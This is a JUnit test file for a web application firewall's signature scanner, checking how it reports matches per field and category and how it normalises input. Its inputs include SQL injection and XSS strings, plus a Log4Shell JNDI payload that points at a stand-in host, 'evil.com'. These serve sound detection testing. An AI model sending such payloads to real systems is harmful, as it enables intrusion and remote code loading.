package com.wafgateway.worklet1.signature;

import com.wafgateway.worklet1.request.Field;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;
import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests for SignatureScanner: field/category reporting, multi-field
 * scanning, the one-match-per-(field,category) cap, and extensibility to a
 * brand-new rule category with no code change.
 */
class SignatureScannerTest {

    private static List<Rule> loadRealRules() throws RuleLoadException {
        return RuleLoader.load("rules.txt");
    }

    private static Field field(String name, String value) {
        return new Field(name, value.getBytes(StandardCharsets.UTF_8));
    }

    @Test
    void testReportsCorrectFieldNameAndCategory() throws Exception {
        SignatureScanner scanner = new SignatureScanner(loadRealRules(), 10_000);
        List<Match> matches = scanner.scan(List.of(field("query.id", "1 union select password")));

        assertEquals(1, matches.size());
        Match match = matches.get(0);
        assertEquals("query.id", match.fieldName());
        assertEquals("SQLI", match.category());
        assertEquals("SQL-01", match.ruleId());
    }

    @Test
    void testTwoFieldsProduceTwoMatches() throws Exception {
        SignatureScanner scanner = new SignatureScanner(loadRealRules(), 10_000);
        Field queryField = field("query.id", "1 union select password");
        Field headerField = field("header.referer", "javascript:alert(1)");

        List<Match> matches = scanner.scan(List.of(queryField, headerField));

        assertEquals(2, matches.size());
        assertTrue(matches.stream().anyMatch(m -> m.fieldName().equals("query.id") && m.ruleId().equals("SQL-01")));
        assertTrue(matches.stream().anyMatch(m -> m.fieldName().equals("header.referer") && m.ruleId().equals("XSS-02")));
    }

    @Test
    void testCleanFieldsProduceNoMatches() throws Exception {
        SignatureScanner scanner = new SignatureScanner(loadRealRules(), 10_000);
        List<Match> matches = scanner.scan(List.of(
                field("path", "/api/users"),
                field("query.name", "alice"),
                field("header.user-agent", "curl/8.0")));
        assertTrue(matches.isEmpty());
    }

    @Test
    void testAtMostOneMatchPerFieldPerCategory() throws Exception {
        // This text could trip both SQL-01 (union select) and SQL-06
        // (information_schema) - both in the SQLI category - but only one
        // match for the SQLI category should be reported for this field.
        SignatureScanner scanner = new SignatureScanner(loadRealRules(), 10_000);
        List<Match> matches = scanner.scan(List.of(
                field("body", "union select * from information_schema.tables")));

        long sqliMatchCount = matches.stream().filter(m -> m.category().equals("SQLI")).count();
        assertEquals(1, sqliMatchCount);
    }

    @Test
    void testPositionIsOffsetInNormalizedText() throws Exception {
        SignatureScanner scanner = new SignatureScanner(loadRealRules(), 10_000);
        // Raw text has percent-encoding that shrinks after normalization, so
        // the position must refer to the normalized string, not the raw one.
        List<Match> matches = scanner.scan(List.of(field("query.x", "%27%20OR%201%3D1")));

        assertEquals(1, matches.size());
        Match match = matches.get(0);
        assertEquals("SQL-02", match.ruleId());
        // Normalized text is "' or 1=1" (8 chars); the match starts at index 0
        // and the search reports the position right after the match ends.
        assertTrue(match.position() <= 8, "position=" + match.position() + " should be within normalized length");
    }

    @Test
    void testIsQueryAppliedOnlyToQueryFields() throws Exception {
        // '+' only becomes a space for query.* fields. SQL-01's pattern needs
        // a non-word character right after "select", so a trailing '+x' gives
        // it something to match once (and only once) '+' becomes a space.
        SignatureScanner scanner = new SignatureScanner(loadRealRules(), 10_000);

        List<Match> bodyMatches = scanner.scan(List.of(field("body", "union+select+x")));
        assertTrue(bodyMatches.isEmpty(), "body field should not treat '+' as space");

        List<Match> queryMatches = scanner.scan(List.of(field("query.x", "union+select+x")));
        assertFalse(queryMatches.isEmpty(), "query field should treat '+' as space, revealing 'union select'");
    }

    @Test
    void testNewCategoryWorksWithNoCodeChange() throws Exception {
        List<Rule> rules = List.of(
                new Rule("SQL-01", "SQLI", Severity.HIGH, "union\\s+select"),
                new Rule("LOG-01", "LOG4SHELL", Severity.CRITICAL, "\\$\\{jndi:"));
        SignatureScanner scanner = new SignatureScanner(rules, 10_000);

        assertEquals(2, scanner.categoryDfas().size());
        List<Match> matches = scanner.scan(List.of(field("body", "attack: ${jndi:ldap://evil.com/a}")));
        assertEquals(1, matches.size());
        assertEquals("LOG-01", matches.get(0).ruleId());
        assertEquals("LOG4SHELL", matches.get(0).category());
    }

    @Test
    void testCategoryDfaStateCountsArePositive() throws Exception {
        SignatureScanner scanner = new SignatureScanner(loadRealRules(), 10_000);
        assertEquals(3, scanner.categoryDfas().size());
        for (CategoryDfa cd : scanner.categoryDfas()) {
            assertTrue(cd.stateCount() > 0, cd.category() + " should have a positive state count");
        }
    }
}
